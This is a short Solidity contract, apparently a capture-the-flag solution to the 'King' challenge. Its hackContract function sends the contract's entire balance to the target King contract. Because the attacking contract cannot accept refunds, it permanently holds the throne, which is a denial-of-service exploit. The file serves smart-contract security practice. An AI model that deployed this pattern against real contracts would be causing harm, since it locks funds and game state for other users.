// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    King public king;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        king = King(payable(contractAddress));
    }

    function hackContract() external payable {
        // king.receive{value: msg.value}();
        console.log("test123");
        payable(contractAddress).call{value: address(this).balance}("");
    }
}
